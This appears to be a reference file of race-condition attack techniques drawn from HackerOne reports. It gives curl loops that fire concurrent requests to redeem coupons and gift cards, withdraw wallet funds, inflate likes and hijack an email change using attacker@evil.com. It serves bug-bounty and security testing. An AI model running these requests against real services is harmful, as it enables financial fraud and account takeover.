---
name: "h1-race-condition-techniques"
description: "Race Condition / TOCTOU patterns from HackerOne reports — concurrent coupon usage, wallet withdrawal race, folder rename race, like/unlike race, gift card race, and mass assignment race"
category: web-security
tags: ["race-condition", "toctou", "concurrent", "time-of-check", "business-logic", "hackerone"]
relevance: 9
---

# H1 Race Condition Techniques

Real-world Race Condition vulnerabilities from HackerOne:

## 1. Coupon/Promo Code Race
Send 50+ concurrent requests with same coupon code:
```bash
for i in {1..50}; do
  curl -X POST https://target.com/api/coupon/redeem \
    -H "Cookie: session=..." \
    -d '{"code":"SAVE50"}' &
done
```
If coupon applied multiple times → race condition

## 2. Wallet/Withdrawal Race
Send concurrent withdrawal requests:
```bash
for i in {1..20}; do
  curl -X POST https://target.com/api/wallet/withdraw \
    -d '{"amount":100,"currency":"USD"}' &
done
```
If balance doesn't decrement properly → race

## 3. Folder/File Rename Race
Send rename and access concurrently:
```bash
# Request 1: Rename folder
curl -X POST https://target.com/api/folder/rename \
  -d '{"id":123,"name":"new_name"}' &
# Request 2: Access old folder simultaneously  
curl https://target.com/api/folder/123/files &
```

## 4. Like/Favorite Race
Send concurrent like/unlike:
```bash
for i in {1..100}; do
  curl -X POST https://target.com/api/post/456/like &
done
```
Check if like count exceeds expected maximum

## 5. Gift Card Balance Race
Send concurrent gift card redemption requests:
```bash
for i in {1..10}; do
  curl -X POST https://target.com/api/giftcard/redeem \
    -d '{"code":"GIFT123"}' &
done
```

## 6. Email Change Race
Send old email change + new email verification concurrently:
```bash
# Request 1: Change email
curl -X POST https://target.com/api/user/email \
  -d '{"email":"attacker@evil.com"}' &
# Request 2: Confirm old email link simultaneously
curl https://target.com/api/confirm?token=OLD_TOKEN &
```

## Testing Methodology:
1. Use Burp Intruder with 20-50 concurrent threads
2. Use `race-the-web` tool or custom Python async scripts
3. Focus on: money operations, access control checks, inventory operations
4. Pay attention to: email/SMS rate limits, coupon usage limits, balance deductions
